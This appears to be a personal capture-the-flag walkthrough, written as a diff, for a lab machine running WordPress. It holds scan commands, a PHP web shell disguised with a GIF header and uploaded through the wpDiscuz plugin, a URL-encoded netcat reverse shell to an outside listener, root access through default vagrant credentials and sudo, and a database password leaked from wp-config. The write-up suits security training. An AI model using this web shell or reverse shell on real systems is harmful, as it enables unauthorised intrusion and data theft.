@@ -1,0 +1,74 @@
+nmap found port 22, 80 open
+sudo nano /etc/hosts #important
+add 192.168.144.217 blogger.pg 
+$ feroxbuster -u http://192.168.144.217:80 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+
+301      GET        9l       28w      342c http://192.168.144.217/assets/fonts/blog/wp-includes => http://192.168.144.217/assets/fonts/blog/wp-includes/
+301      GET        9l       28w      339c http://192.168.144.217/assets/fonts/blog/wp-admin => http://192.168.144.217/assets/fonts/blog/wp-admin/
+301      GET        9l       28w      330c http://192.168.144.217/assets/fonts/blog => http://192.168.144.217/assets/fonts/blog/
+301      GET        9l       28w      341c http://192.168.144.217/assets/fonts/blog/wp-content => http://192.168.144.217/assets/fonts/blog/wp-content/
+
+shows potential WordPress Vulnerability
+
+$ wpscan --url http://192.168.144.217/assets/fonts/blog --plugins-detection aggressive --disable-tls-checks
+
+Upload directory has listing enabled: http://192.168.144.217/assets/fonts/blog/wp-content/uploads/
+http://192.168.144.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/
+Version: 7.0.4
+
+found below page can upload comments attached with gif. us it to upload this payload.
+http://blogger.pg/assets/fonts/blog/?p=1
+below payload include a cmd injection with gif header.
+GIF89a;
+<?php
+echo"<pre>";
+passthru($_GET['cmd']);
+echo"<pre>";
+?>
+After upload, right click the file, copy image link
+http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/04/img-1776073245.4054.php
+
+add ?cmd=id show command injection success.
+GIF89a;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+revshell.com  nc mkfifo with URL encode. add to ?cmd=
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.45.161%204444%20%3E%2Ftmp%2Ff
+
+get a reverse shell on port 4444 listener with www-data privilege
+
+su vagrant
+password: vagrant
+sudo -l
+User vagrant may run the following commands on ubuntu-xenial:
+    (ALL) NOPASSWD: ALL
+
+vagrant@ubuntu-xenial:/home$ sudo su
+sudo su
+root@ubuntu-xenial:/home# id 
+id 
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------
+upload and run linpeas
+found 
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r--r-- 1 www-data root 2878 Jan 17  2021 /var/www/wordpress/assets/fonts/blog/wp-config.php                                                                                         
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'sup3r_s3cr3t');
+define('DB_HOST', 'localhost');
+
+$ mysql -uroot -psup3r_s3cr3t
+
+show databases;
+use <table_name>;
+no finding.
+
+
+
